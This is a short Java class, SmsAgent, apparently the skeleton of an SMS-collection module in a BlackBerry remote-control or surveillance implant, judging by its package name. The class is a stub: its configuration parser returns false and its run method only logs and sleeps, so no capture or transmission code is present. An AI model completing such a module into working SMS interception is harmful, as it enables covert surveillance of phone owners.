package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class SmsAgent extends Agent
{
	static Debug debug = new Debug("SmsAgent", DebugLevel.VERBOSE );

	public SmsAgent(int AgentStatus)
	{
		super(AGENT_SMS, AgentStatus, true);
	}

	protected SmsAgent(int AgentStatus, byte[] confParams)
	{
		this(AgentStatus);
		Parse(confParams);
	}

	protected boolean Parse(byte[] confParameters)
	{
		// TODO Auto-generated method stub
		return false;
	}

	public void AgentRun()
	{
		debug.trace("run");
		this.SleepUntilStopped();

	}



}
